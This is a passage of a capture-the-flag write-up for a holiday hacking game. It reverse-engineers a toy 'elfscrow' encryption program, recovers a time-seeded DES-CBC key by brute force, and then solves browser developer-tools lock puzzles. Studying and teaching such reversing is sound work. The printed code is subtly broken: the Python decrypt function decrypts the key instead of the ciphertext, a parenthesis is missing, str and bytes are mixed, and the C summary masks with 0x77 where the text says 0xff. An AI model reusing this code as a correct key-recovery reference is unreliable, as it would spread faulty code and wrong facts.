<span class="underline">That</span> guy knows how to rip a thing apart. It's like he <b>breathes</b> opcodes!
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.</i>
</p>

<p>
<b>Reverse Engineering</b>: <a href="https://youtu.be/obJdpKDpFBA">Reversing Crypto the Easy Way</a>
</p>

</div>
</div>
</div>
<div id="outline-container-orgb34711c" class="outline-4">
<h4 id="orgb34711c">Solution</h4>
<div class="outline-text-4" id="text-orgb34711c">
<p>
For this objective, we found Ron Bowes's talk, "Reversing Crypto the Easy Way," to be quite informative.
</p>

<p>
We start by playing with the elfscrow.exe binary to see what it does. We downloaded a <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">free test VM</a> of Windows 10, not just because we don't have Windows installed, but it's always a good idea to execute "unknown" binaries in an isolated environment (though we do trust the HHC team). Running 'elfscrow.exe' the first time we can see a list of available options:
</p>


<div class="figure">
<p><img src="./imgs/obj_10/elfscrow-run-1.png" alt="elfscrow-run-1.png" width="50%" />
</p>
<p><span class="figure-number">Figure 49: </span>First run of elfscrow.exe</p>
</div>

<p>
Well, we can't decrypt anything yet because we don't know the key, but perhaps encrypting our own file will lead to some information.
</p>

<div class="figure">
<p><img src="./imgs/obj_10/elfscrow-encrypt.png" alt="elfscrow-encrypt.png" width="60%" />
</p>
<p><span class="figure-number">Figure 50: </span>Elfscrow.exe &#x2013;encrypt test</p>
</div>

<p>
This gives us two very important pieces of information. First, the initial seed appears to be unix epoch time. If you run the process quickly in succession you'll get the same key. That doesn't mean it's the final seed, but it is a starting point. The second important point is that the key is only 8 bytes long. As a result of the 8-byte key, Ron tells us in his talk that there's a very good chance the encryption scheme uses DES.
</p>

<p>
Using the <code>--insecure</code> flag we can even see the secret ID being uploaded to the elfscrow server in clear text using <a href="https://www.wireshark.org/">Wireshark</a> (just like the instructions warned us).
</p>

<div class="figure">
<p><img src="./imgs/obj_10/wireshark.png" alt="wireshark.png" width="40%" />
</p>
<p><span class="figure-number">Figure 51: </span>Elfscrow.exe key upload failure</p>
</div>

<p>
In fact, if attempt to upload the same thing twice, you will get a rejection from the elfscrow server:
</p>

<div class="figure">
<p><img src="./imgs/obj_10/elfscrow-fail.png" alt="elfscrow-fail.png" width="60%" />
</p>
<p><span class="figure-number">Figure 52: </span>Elfscrow.exe key upload failure</p>
</div>

<p>
At this point, we focus on a few specific goals:
</p>

<div class="goal">
<p>
Determine the seed
</p>

<p>
Determine the cipher and mode (if an IV is needed, what is it?)
</p>

<p>
How can we verify the encryption key is correct?
</p>

</div>
</div>
</div>

<div id="outline-container-org92fac12" class="outline-4">
<h4 id="org92fac12">IDA Setup</h4>
<div class="outline-text-4" id="text-org92fac12">
<p>
For the next phase of the investigation we downloaded the <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">free version of IDA</a>. While loading the binary, IDA automatically detects the path where it's supposed to find the PDB debug file:
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-pdb-file.png" alt="ida-pdb-file.png" width="40%" />
</p>
<p><span class="figure-number">Figure 53: </span>PDB file path</p>
</div>

<p>
Since ours isn't in that location, we can just load the PDB file via the menu.
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-pdb-load.png" alt="ida-pdb-load.png" width="60%" />
</p>
<p><span class="figure-number">Figure 54: </span>PDB file load in IDA</p>
</div>

<p>
Strictly speaking we don't need the debugging information, but it's definitely easier when we can look for functions by name and see comments. Our goal is to figure out what happens when elfscrow.exe generates a new key, so we have to execute the program with the right options. IDA allows us to set those options:
</p>

<div class="figure">
<p><img src="./imgs/obj_10/ida-process-options.png" alt="ida-process-options.png" width="60%" />
</p>
<p><span class="figure-number">Figure 55: </span>Setting Process Options in IDA</p>
</div>

<p>
We'll use the same options we used on the command line (&#x2013;encrypt test.txt test.enc), but we haven't actually run the program yet.
</p>

<div class="figure">
<p><img src="./imgs/obj_10/ida-process-options2.png" alt="ida-process-options2.png" width="60%" />
</p>
<p><span class="figure-number">Figure 56: </span>Setting Process Options in IDA</p>
</div>

<p>
Note that we aren't actually asking IDA to execute yet, just getting things ready. 
</p>
</div>
</div>

<div id="outline-container-orga9c01b2" class="outline-4">
<h4 id="orga9c01b2">Generate Key Function</h4>
<div class="outline-text-4" id="text-orga9c01b2">
<p>
Taking a quick look at the function names on the left we see <code>generate_key</code> right there!  By clicking on the <code>generate_key</code> function name, IDA will bring up its process flow:
</p>

<div class="figure">
<p><img src="./imgs/obj_10/ida-generate_key.png" alt="ida-generate_key.png" width="60%" />
</p>
<p><span class="figure-number">Figure 57: </span>Locating the generate_key() function</p>
</div>

<p>
Let's look at <code>generate_key()</code> a little closer.
</p>

<div class="figure">
<p><img src="./imgs/obj_10/ida-generate_key_annotated.png" alt="ida-generate_key_annotated.png" width="60%" />
</p>
<p><span class="figure-number">Figure 58: </span>generate_key() details</p>
</div>

<ol class="org-ol">
<li>This is definitely where we want to be. First we can see where the <code>Our miniature elves...</code> line is printed to the console like we saw in our sample runs.</li>
<li>Here is the call to <code>time()</code> which gets stored in <code>eax</code>.</li>
<li>Normally we'd probably see a call to <code>srand()</code>, but instead we see <code>super_secret_srand()</code>. Let's click on that and take a look.</li>
<li>The last thing that happens before moving on is we set the local variable <code>var_4</code> to 0. We'll come back to this later.</li>
</ol>

<div class="figure">
<p><img src="./imgs/obj_10/ida-super_secret_srand_annotated.png" alt="ida-super_secret_srand_annotated.png" width="40%" />
</p>
<p><span class="figure-number">Figure 59: </span>super_secret_srand() details</p>
</div>

<ol class="org-ol">
<li>Not a whole lot here, but we can see <code>Seed = %d\n\n</code> get printed. We expected this from the initial output as well.</li>
</ol>

<p>
Of note is that <code>super_secret_srand()</code> didn't actually call <code>srand()</code>, but it's possible we'll see it later in the key generation (hot tip: we don't). At this point we know <code>generate_key()</code> still has unix time as its seed and we're expecting to see a <code>printf()</code> for <code>Generated an encryption key...</code>.
</p>

<p>
To help us follow the code path, we're going to set a breakpoint and actually execute the program so we can step through each instruction. Going back to the <code>generate_key()</code> function, we set a break point right after the call to <code>super_secret_srand()</code>:
</p>

<div class="figure">
<p><img src="./imgs/obj_10/ida-set-breakpoint.png" alt="ida-set-breakpoint.png" width="40%" />
</p>
<p><span class="figure-number">Figure 60: </span>Set breakpoint after super_secret_srand()</p>
</div>

<p>
The breakpoint was set by clicking on the line and then the breakpoint icon <img src="./imgs/obj_10/ida-breakpoint-icon.png" alt="ida-breakpoint-icon.png" />.
</p>

<p>
Now, for the first time in IDA, we'll execute the program by hitting the little green 'play' triangle.
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-green-triangle.png" alt="ida-green-triangle.png" width="30px" />
</p>
<p><span class="figure-number">Figure 61: </span>Execute program</p>
</div>

<p>
The elfscrow.exe program will execute up to our breakpoint and stop.
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-execute-to-breakpoint.png" alt="ida-execute-to-breakpoint.png" width="70%" />
</p>
<p><span class="figure-number">Figure 62: </span>Execute program to breakpoint</p>
</div>

<p>
At this point we can step through the program using these buttons:
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-step-buttons.png" alt="ida-step-buttons.png" width="33%" />
</p>
<p><span class="figure-number">Figure 63: </span>Step buttons</p>
</div>

<p>
Various uses of the step ability are useful to see how variables change without getting too bogged down in things like calls to <code>printf()</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-key-generation-loop.png" alt="ida-key-generation-loop.png" width="500px" />
</p>
<p><span class="figure-number">Figure 64: </span>Key Generation Loop, Part 1</p>
</div>

<p>
At the end of <code>generate_key()</code> it splits off into a loop.
</p>

<ol class="org-ol">
<li>Remember when we set <code>var_4</code> to 0?  That is like setting <code>i=0</code> and this <code>cmp</code> instruction is comparing <code>var_4</code> (or <code>i</code>) to 8. <code>jnb</code> is just "jump if not below," or "jump if greater than or equal to."</li>
<li>This is the real meat of the key generation loop and the next thing we'll look at.</li>
<li>Continuing with our high level view, this is adding 1 to <code>var_4</code>. (ie, <code>i++</code>)</li>
<li>After we do that 8 times, the comparison will jump here and return the generated key.</li>
</ol>


<div class="figure">
<p><img src="./imgs/obj_10/ida-key-generation-loop-2.png" alt="ida-key-generation-loop-2.png" width="60%" />
</p>
<p><span class="figure-number">Figure 65: </span>Key Generation Loop, Part 2</p>
</div>

<ol class="org-ol">
<li>A call to a <code>super_secure_random()</code> function that we'll dig into after this, but for now we just need to know that functions generally return their values into <code>eax</code>.</li>
<li><code>al</code> refers to the least significant 8 bits of <code>eax</code> and <code>movzx</code> 'zero extends'(pads) the value with zeros to the full register size (32bits). So this moves the last 8 bits of what <code>super_secure_random()</code> gave us into <code>ecx</code>. This is important to note because we are basically throwing away the other 24 higher bits.</li>
<li>This instruction is doing a bitwise AND of <code>ecx</code> and the hex value <code>0xff</code> (which is <code>11111111</code> in binary, so this also calculates the least significant 8 bits. This is redundant, and likely just a compiler inefficiency.</li>
<li>We first load our function argument <code>arg_0</code>, and then add the number of iterations through the loop (what we've been calling <code>i</code>) to that.</li>
<li>There's a difference between <code>mov edx, cl</code> and <code>mov [edx], cl</code>. When using square brackets, we're using <code>edx</code> as a pointer, and storing the value in the memory address it's pointing to.</li>
</ol>

<p>
Reference: <a href="http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html">http://flint.cs.yale.edu/cs421/papers/x86-asm/asm.html</a>
</p>

<p>
In assembly, this looks very complex, but as we step through it, we realize all that's happening is:
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b58900;">void</span> <span style="color: #268bd2;">generate_key</span>(<span style="color: #b58900;">char</span>* <span style="color: #dc322f;">key</span>)
{
    <span style="color: #586e75;">// </span><span style="color: #657b83;">Generates a key, and stores it in the function argument</span>
    <span style="color: #6c71c4;">for</span> ( i = 0; i &lt; 8; i++ )
        key[i] = super_secure_random &amp; 0x77;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-org819490f" class="outline-4">
<h4 id="org819490f">Super Secure Random Function</h4>
<div class="outline-text-4" id="text-org819490f">

<div class="figure">
<p><img src="./imgs/obj_10/ida-super_secure_random-annotated.png" alt="ida-super_secure_random-annotated.png" width="60%" />
</p>
<p><span class="figure-number">Figure 66: </span>Super Secure Random</p>
</div>

<ol class="org-ol">
<li>The debugging file references a global variable called <code>state</code>. That value has been copied into <code>eax</code> and here we multiply it by <code>0x343FD</code>.</li>
<li>Then we add <code>0x269EC3</code>.</li>
<li>At this point, we update our global variable with the new state, which we'll use during the next iteration.</li>
<li><code>sar</code> means "shift arithmetic right" and <code>0x10</code> (decimal 16) is how far to shift. Just how shifting a decimal number to the right one place (e.g. 30 -&gt; 3) we divide by 10, shifting binary to the right one place is equivalent to dividing by 2. If we do that 16 times, it's the same as dividing by 2^16 (65536).</li>
<li>This is a bitwise AND with <code>0x7FFF</code>. (As it turns out, since we keep throwing away all but the last 8 bits each time through the loop, this instruction can be completely ignored. It's likely converting a signed integer to an unsigned one).</li>
</ol>

<p>
Ron suggested in his talk that Googling these values may turn up some additional information:
</p>

<p>
<a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">https://en.wikipedia.org/wiki/Linear_congruential_generator</a>
</p>

<p>
As it turns out, the two hex numbers we see are the "multiplier" and "incrementer" from the rand() implementation for Microsoft Visual C. 
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b58900;">uint32_t</span> <span style="color: #dc322f;">state</span>;

<span style="color: #b58900;">int</span> <span style="color: #268bd2;">rand</span>() {
    state = state * 214013 + 2531011;
    <span style="color: #6c71c4;">return</span> (state &gt;&gt; 16) &amp; 0x7fff;
}
</pre>
</div>

<p>
With this, while a bit complicated, we have all of the information we need to re-create the seed as long as we know what time the file was encrypted. As we know from the objective introduction, "We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC."  That gives us 7200 possible seconds that could be the intial time.
</p>
</div>
</div>

<div id="outline-container-org365fc72" class="outline-4">
<h4 id="org365fc72">Determining the Cipher</h4>
<div class="outline-text-4" id="text-org365fc72">
<p>
Next we need to focus on the cipher. Stepping through the program until <code>generate_key()</code> returns, we can see the call to CryptImportKey shortly after <code>generate_key()</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj_10/ida-crypt-import-key.png" alt="ida-crypt-import-key.png" width="500px" />
</p>
<p><span class="figure-number">Figure 67: </span>DES-CBC</p>
</div>

<p>
Aha!  We suspected the cipher was DES, but this comment helps confirm not only DES, but CBC mode.
</p>

<p>
What about the initialization vector (IV)?  Taking another tip from Ron, we do a lot of Googling. It would appear that we'd normally expect a call to <code>CryptGenKey()</code> and the Microsoft documentation says:
</p>

<p>
"If keys are generated for symmetric block ciphers, the key, by default, is set up in cipher block chaining (CBC) mode with an initialization vector of zero."
<a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenkey">https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptgenkey</a>
</p>

<p>
Our <code>generate_key()</code> function replaced this and didn't include an IV either, so when reimplmenting it's safe to set the IV=0. 
</p>
</div>
</div>

<div id="outline-container-orgaf03051" class="outline-4">
<h4 id="orgaf03051">Validating the Key</h4>
<div class="outline-text-4" id="text-orgaf03051">
<p>
At this point we can reimplement the encryption scheme, but we need a way to know if we got it right. Fortunately, we know the encrypted file is a PDF. We could decrypt the whole file and try to open it (7200 times), or run 'file' against it, but there's a faster way. If we decrypt just the first few bytes we can match it against the known file signature for a PDF.
</p>

<p>
Reference: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #586e75;">#</span><span style="color: #657b83;">!/usr/bin/env python</span>

<span style="color: #6c71c4;">from</span> Crypto.Cipher <span style="color: #6c71c4;">import</span> DES
<span style="color: #6c71c4;">import</span> datetime
<span style="color: #6c71c4;">import</span> sys

<span style="color: #dc322f;">pdf_filename</span> = <span style="color: #859900;">'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf'</span>

<span style="color: #dc322f;">ciphertext_header</span> = b<span style="color: #859900;">'\x5d\xbd\xce\xdc\x49\x4a\x74\x43'</span>

<span style="color: #586e75;"># </span><span style="color: #657b83;">A PDF always starts with:</span>
<span style="color: #dc322f;">plaintext_header</span> = <span style="color: #859900;">'%PDF-'</span>

<span style="color: #586e75;"># </span><span style="color: #657b83;">We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.</span>
<span style="color: #dc322f;">start_time</span> = 1575658800
<span style="color: #dc322f;">end_time</span> = 1575666000

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">generate_key</span>(seed):
    <span style="color: #839496;">"""This just implements the assembly we've discovered so far.</span>

<span style="color: #839496;">    Takes a seed, returns a key as a bytestring."""</span>

    <span style="color: #dc322f;">result</span> = b<span style="color: #859900;">""</span>

    <span style="color: #6c71c4;">for</span> i <span style="color: #6c71c4;">in</span> <span style="color: #2aa198;">range</span>(8):  <span style="color: #586e75;"># </span><span style="color: #657b83;">cmp [var_4], 8; jnb exit</span>
        <span style="color: #dc322f;">seed</span> *= 0x343FD     <span style="color: #586e75;"># </span><span style="color: #657b83;">imul eax, 343FDh</span>
        <span style="color: #dc322f;">seed</span> += 0x269EC3    <span style="color: #586e75;"># </span><span style="color: #657b83;">add eax, 269EC3h</span>
                            <span style="color: #586e75;"># </span><span style="color: #657b83;">mov state, eax</span>
        <span style="color: #dc322f;">eax</span> = seed          <span style="color: #586e75;"># </span><span style="color: #657b83;">mov eax, state</span>
        <span style="color: #dc322f;">eax</span> /= 2**16        <span style="color: #586e75;"># </span><span style="color: #657b83;">sar eax, 10h</span>
        <span style="color: #dc322f;">r</span> = <span style="color: #2aa198;">chr</span>(eax &amp; 0xff) <span style="color: #586e75;"># </span><span style="color: #657b83;">and eax, 7FFFh</span>
        <span style="color: #dc322f;">result</span> += r    <span style="color: #586e75;"># </span><span style="color: #657b83;">mov [arg_0 + var_4], eax</span>

    <span style="color: #6c71c4;">return</span> result

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">decrypt</span>(key, ciphertext):
    <span style="color: #839496;">"""Decrypts a ciphertext string, and returns the result"""</span>
    <span style="color: #dc322f;">iv</span> = b<span style="color: #859900;">'\x00\x00\x00\x00\x00\x00\x00\x00'</span>
    <span style="color: #dc322f;">decryptor</span> = DES.new(key, DES.MODE_CBC, iv)
    <span style="color: #6c71c4;">return</span> decryptor.decrypt(key)

<span style="color: #6c71c4;">for</span> i <span style="color: #6c71c4;">in</span> <span style="color: #2aa198;">range</span>(start_time, end_time):
    <span style="color: #6c71c4;">if</span> decrypt(generate_key(i), ciphertext_header).startswith(plaintext_header):
        <span style="color: #586e75;"># </span><span style="color: #657b83;">At least the first few bytes are correct, so we'll try to decrypt our file.</span>
        <span style="color: #6c71c4;">with</span> <span style="color: #2aa198;">open</span>(pdf_filename + <span style="color: #859900;">'.enc'</span>) <span style="color: #6c71c4;">as</span> ciphertext:
            <span style="color: #6c71c4;">with</span> <span style="color: #2aa198;">open</span>(pdf_filename, <span style="color: #859900;">'wb'</span>) <span style="color: #6c71c4;">as</span> plaintext:
                plaintext.write(decrypt(generate_key(i), ciphertext.read())

        <span style="color: #6c71c4;">print</span>(<span style="color: #859900;">"Successfully decrypted file (seed=%d), and saved to %s"</span> % (i, pdf_filename))
        <span style="color: #6c71c4;">break</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org7900b75" class="outline-4">
<h4 id="post_decryption"><a id="org7900b75"></a>Post-decryption</h4>
<div class="outline-text-4" id="text-post_decryption">
<p>
Now that we have the decrypted PDF, it's time to take a look.
</p>

<p>
On page three we read the following which will be useful later:
</p>

<blockquote>
<p>
The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository.
</p>
</blockquote>

<p>
At this time we will also take a moment to point out a potential safety issue with the Super Sled-O-Matic (SSOM) installation instructions. The first suggested installation location is "Right side of sled under the flight abort ejector seat."  As the large activation button on the SSOM needs to be held down for activation, there is a potential that someone reaching down could inadvertently activate the ejector seat. Especially if they are wearing a long sleeve coat with fluffy white cuffs.
</p>
</div>
</div>
</div>
<div id="outline-container-orgff4beb1" class="outline-3">
<h3 id="obj11"><a id="orgff4beb1"></a>11. Open the Sleigh Shop Door 🎄🎄🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj11">
</div>
<div id="outline-container-org75c56e1" class="outline-4">
<h4 id="org75c56e1">Background</h4>
<div class="outline-text-4" id="text-org75c56e1">
<p>
This objective instructs us to:
</p>

<blockquote>
<p>
Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?
</p>
</blockquote>

<p>
Visiting Shinny lays out our challenge:
</p>

<div class="chat">
<p>
<i>Psst - hey!</i>
</p>

<p>
I'm Shinny Upatree, and <b>I*</b> know what's going on!
</p>

<p>
Yeah, that's right - guarding the sleigh shop has made me privvy to some <span class="underline">serious</span>, high-level intel.
</p>

<p>
In fact, I know WHO is causing all the trouble.
</p>

<p>
Cindy? Oh no no, not <span class="underline">that</span> who.  And stop guessing - you'll never figure it out.
</p>

<p>
The only way you <span class="underline">could</span> would be if you could break into <a href="https://crate.elfu.org">my crate</a>, here.
</p>

<p>
You see, I've written the villain's name down on a piece of paper and hidden it away securely!
</p>

</div>

<div class="goal">
<p>
Crack into the crate at <a href="https://crate.elfu.org">https://crate.elfu.org</a>, and retrieve the paper hidden therein.
</p>

</div>

<p>
Once we solve the <a href="#term_iptables">iptables terminal</a>, Kent tells us:
</p>

<div class="chat">
<p>
Oh thank you!  It's so nice to be back in my own head again.  Er, alone.
</p>

<p>
By the way, have you tried to get into the crate in the Student Union?  It has an interesting set of locks.
</p>

<p>
There are funny rhymes, references to perspective, and odd mentions of eggs!
</p>

<p>
And if you think the stuff in your browser looks strange, you should see the page source&#x2026;
</p>

<p>
Special tools?  No, I don't think you'll need any extra tooling for those locks.
</p>

<p>
BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. (<a href="https://developers.google.com/web/tools/chrome-devtools">Chrome Dev Tools</a>)
</p>

<p>
Or sorry, you're a Firefox fan? (<a href="https://developer.mozilla.org/en-US/docs/Tools">Firefox Dev Tools</a>)
</p>

<p>
Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. (<a href="https://developer.apple.com/safari/tools/">Safari Dev Tools</a>)
</p>

<p>
Edge?  That's cool.  Hm?  No no, I was thinking of an unrelated thing. (<a href="https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide/console">Edge Dev Tools</a>)
</p>

<p>
Curl fan?  Right on!  Just remember: the Windows one doesn't like double quotes. (<a href="https://curl.haxx.se/docs/manpage.html">Curl Dev Tools</a>)
</p>

<p>
Old school, huh?  Oh sure - I've got what you need right here&#x2026; (<a href="https://xkcd.com/325/">Lynx Dev Tools</a>)
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard.
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.</i>
</p>

<p>
<b>Chrome Dev Tools</b>: <a href="https://developers.google.com/web/tools/chrome-devtools">Chrome Dev Tools</a>
</p>

<p>
<b>Firefox Dev Tools</b>: <a href="https://developer.mozilla.org/en-US/docs/Tools">Firefox Dev Tools</a>
</p>

<p>
<b>Safari Dev Tools</b>: <a href="https://developer.apple.com/safari/tools/">Safari Dev Tools</a>
</p>

<p>
<b>Edge Dev Tools</b>: <a href="https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide/console">Edge Dev Tools</a>
</p>

<p>
<b>Curl Dev Tools</b>: <a href="https://curl.haxx.se/docs/manpage.html">Curl Dev Tools</a>
</p>

<p>
<b>Lynx Dev Tools</b>: <a href="https://xkcd.com/325/">Lynx Dev Tools</a>
</p>

</div>

<p>
<a href="#term_trail_hard">Completing the Holiday Hack Trail on hard</a> reveals the following in the source code of the victory screen:
</p>

<div class="org-src-container">
<pre class="src src-html"><span style="color: #586e75;">&lt;!--</span>
<span style="color: #657b83;">1 - When I'm down, my F12 key consoles me</span>
<span style="color: #657b83;">2 - Reminds me of the transition to the paperless naughty/nice list...</span>
<span style="color: #657b83;">3 - Like a present stuck in the chimney!  It got sent...</span>
<span style="color: #657b83;">4 - We keep that next to the cookie jar</span>
<span style="color: #657b83;">5 - My title is toy maker the combination is 12345</span>
<span style="color: #657b83;">6 - Are we making hologram elf trading cards this year?</span>
<span style="color: #657b83;">7 - If we are, we should have a few fonts to choose from</span>
<span style="color: #657b83;">8 - The parents of spoiled kids go on the naughty list...</span>
<span style="color: #657b83;">9 - Some toys have to be forced active</span>
<span style="color: #657b83;">10 - Sometimes when I'm working, I slide my hat to the left and move odd things onto my scalp!</span>
<span style="color: #586e75;">--&gt;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org1d9802a" class="outline-4">
<h4 id="org1d9802a">Solution</h4>
<div class="outline-text-4" id="text-org1d9802a">
<p>
Visiting the <a href="https://crate.elfu.org/">site</a> from Shinny, we see 10 locks. At the top, it says:
</p>

<p class="verse">
I locked the crate with the villain's name inside. Can you get it out?<br />
</p>

<p>
Since our hints from the Holiday Hack Trail are numbered 1-10, we assume each one is a hint to the respective lock.
</p>
</div>

<ul class="org-ul">
<li><a id="org5dcd554"></a>Lock 1: Console<br />
<div class="outline-text-5" id="text-org5dcd554">
<p class="verse">
You don't need a clever riddle to open the console and scroll a little.<br />
</p>

<div class="trailhint">
<p>
When I'm down, my F12 key consoles me
</p>

</div>

<p>
Hitting <code>F12</code> brings up the Developer Tools (at least in Chrome,
Firefox and Edge). Looking at the documentation from Shinny, we see
that one of the functions of the Developer Tools is to access the
Javascript console, which is mentioned in both the clue and the hint.
</p>

<p>
Clicking on the Console tab shows us a green box with a code.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock1_solution.png" alt="lock1_solution.png" width="25%" />
</p>
<p><span class="figure-number">Figure 68: </span>At the console of an amazing, hand-built computer sits amazing Hopsfield.</p>
</div>

<p>
We can also get a few other hints from the webpage, if needed:
</p>

<div class="gamehint">
<p>
Google: "[your browser name] developer tools console"
</p>

<p>
The code is 8 char alphanumeric
</p>

</div>
</div>
</li>

<li><a id="orgb0e9dcd"></a>Lock 2: Pulp on Dye<br />
<div class="outline-text-5" id="text-orgb0e9dcd">
<p class="verse">
Some codes are hard to spy, perhaps they'll show up on pulp with dye?<br />
</p>

<div class="trailhint">
<p>
Reminds me of the transition to the paperless naughty/nice list&#x2026;
</p>

</div>

<p>
This one is a bit less obvious. Some additional hints give us a pretty clear path:
</p>

<div class="gamehint">
<p>
Most paper is made out of pulp.
</p>

<p>
How can you view this page on paper?
</p>

<p>
Emulate <code>print</code> media, print this page, or view a print preview.
</p>

</div>

<p>
Again, reviewing the documentation, we see that there's a setting to
emulate the CSS media as print. We use the <code>Elements</code> tab in Chrome,
and from the Dev Tools settings (<code>⋮</code> button in the upper right), we go
to <code>More tools</code> -&gt; <code>Rendering</code> and this brings up a new tab at the
bottom of the screen. At the very bottom of this tab, there's the
setting to change the CSS media:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock2_solution.png" alt="lock2_solution.png" />
</p>
<p><span class="figure-number">Figure 69: </span>The piece of paper. It says, "I aced this."</p>
</div>
</div>
</li>

<li><a id="org09fc1cf"></a>Lock 3: Fetched Code<br />
<div class="outline-text-5" id="text-org09fc1cf">
<p class="verse">
This code is still unknown; it was fetched but never shown.<br />
</p>

<div class="trailhint">
<p>
Like a present stuck in the chimney!  It got sent&#x2026;
</p>

</div>

<p>
If something was <b>sent</b> or <b>fetched</b> and never shown, the <code>Network</code>
tab is an obvious target, similar to how <a href="#krampus">we found the image of Krampus and the key</a>. 
The additional hints confirm this:
</p>

<div class="gamehint">
<p>
Google: "[your browser name] view network"
</p>

<p>
Examine the network requests.
</p>

</div>

<p>
Unfortunately, when we open the <code>Network</code> tab, many requests were
missed, because we didn't have it open when the requests were
loading. We can refresh the page, and we notice that the value in the
<code>Console</code> has changed. We re-solve the first two locks and notice an
image in the <code>Network</code> tab. Using the <code>Preview</code> tab, we see it's a code:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock3_solution.png" alt="lock3_solution.png" />
</p>
<p><span class="figure-number">Figure 70: </span>He examines the walls and the floor and looks, for hidden switches or secret mechanisms, all to no avail.</p>
</div>
</div>
</li>

<li><a id="orgc2369b4"></a>Lock 4: Local Storage<br />
<div class="outline-text-5" id="text-orgc2369b4">
<p class="verse">
Where might we keep the things we forage? Yes, of course: Local barrels!<br />
</p>

<div class="trailhint">
<p>
We keep that next to the cookie jar
</p>

</div>

<p>
This is the first clue that doesn't rhyme. Between the clue, the trail
hint, and the additional hint (below), we realize it means the <code>Local
Storage</code> section, under the <code>Application</code> tab, which would correctly rhyme:
</p>

<div class="gamehint">
<p>
Google: "[your browser name] view local storage"
</p>

</div>

<p>
Sure enough, we find the barrels in <code>Local Storage</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock4_solution.png" alt="lock4_solution.png" />
</p>
<p><span class="figure-number">Figure 71: </span>"Just like shooting ducks in a barrel."</p>
</div>
</div>
</li>

<li><a id="org38951b3"></a>Lock 5: Title Code<br />
<div class="outline-text-5" id="text-org38951b3">
<p class="verse">
Did you notice the code in the title? It may very well prove vital.<br />
</p>

<div class="trailhint">
<p>
My title is toy maker the combination is 12345
</p>

</div>

<p>
The additional hint confirms that we should be checking the title:
</p>

<div class="gamehint">
<p>
There are several ways to see the full page title:
</p>
<ul class="org-ul">
<li>Hovering over this browser tab with your mouse</li>
<li>Finding and opening the &lt;title&gt; element in the DOM tree</li>
<li>Typing <code>document.title</code> into the console</li>
</ul>

</div>

<p>
In keeping with the theme of using the Developer Tools, we'll go to
the <code>Elements</code> tab, and search (<code>Ctrl-F</code> on Windows and Linux, <code>⌘+F</code>
on Mac) for <code>title</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock5_solution.png" alt="lock5_solution.png" />
</p>
<p><span class="figure-number">Figure 72: </span>"The day's only so long."</p>
</div>
</div>
</li>

<li><a id="orgea8a87f"></a>Lock 6: All About Your Perspective<br />
<div class="outline-text-5" id="text-orgea8a87f">
<p class="verse">
In order for this hologram to be effective, it may be necessary to increase your perspective.<br />
</p>

<div class="trailhint">
<p>
Are we making hologram elf trading cards this year?
</p>

</div>

<p>
This one was a bit tricky. The hints are pointing us to the
rainbow-colored hologram next to the lock. The additional hints might
help:
</p>

<div class="gamehint">
<p>
<code>perspective</code> is a css property.
</p>

<p>
Find the element with this css property and increase the current value.
</p>

</div>

<p>
The easiest way to find the element is to right-click it, and select <code>Inspect</code>:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock6_inspect.png" alt="lock6_inspect.png" />
</p>
<p><span class="figure-number">Figure 73: </span>"It's basically a filter."</p>
</div>

<p>
Once we've selected the right element, we can view the CSS properties
in the <code>Styles</code> tab of the right side of the Developer Tools. Sure
enough, there's a property named <code>perspective</code>, which we can double
click the default value to change.
</p>

<p>
The meaning of the <code>perspective</code> property is a bit tricky <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/perspective">to
understand</a>. The value is initially <code>15px</code>, which means that we're
sitting 15 pixels away from the hologram. Like sitting too close to
the TV, everything is spread out. As we increase the value of our
perspective, as the hint tells us to do, we move further back from the
hologram, and the letters slowly coalesce into our code. We can keep
increasing the distance until the letters stop moving, or just disable
the whole 3D effect by setting the perspective to <code>0</code> or <code>none</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock6_solution.png" alt="lock6_solution.png" />
</p>
<p><span class="figure-number">Figure 74: </span>"You've increased it to 6 megawatts."</p>
</div>
</div>
